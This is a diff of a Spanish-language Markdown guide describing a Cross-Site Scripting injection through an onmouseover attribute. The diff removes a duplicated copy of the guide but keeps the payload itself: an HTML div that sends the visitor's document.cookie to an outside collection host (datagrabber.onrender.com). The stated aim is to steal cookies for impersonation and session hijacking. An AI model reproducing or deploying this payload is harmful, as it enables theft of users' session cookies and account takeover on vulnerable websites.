@@ -10,24 +10,6 @@ El objetivo de esta técnica es aprovechar una vulnerabilidad de **Cross-Site Sc
 
 #### Código para la inyección:
 
-```javascript
-<div onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + encodeURIComponent(document.cookie))">
-    Pasa el ratón por aquí
-</div>
-
-```
-### Documentación para inyección de código JavaScript usando `onmouseover`
-
-#### Descripción:
-
-Este documento describe cómo realizar una inyección de código JavaScript mediante el evento `onmouseover` en una página web vulnerable. El objetivo es interceptar y enviar cookies del usuario a un servidor externo cuando el usuario pase el ratón sobre un elemento HTML.
-
-#### Objetivo:
-
-El objetivo de esta técnica es aprovechar una vulnerabilidad de **Cross-Site Scripting (XSS)** para robar cookies o información sensible del usuario. Esta información puede ser enviada a un servidor controlado por el atacante para su posterior uso, como la suplantación de identidad o el secuestro de sesiones.
-
-#### Código para la inyección:
-
 ```bash
 `<div onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + encodeURIComponent(document.cookie))">     Pasa el ratón por aquí </div>`
 ```
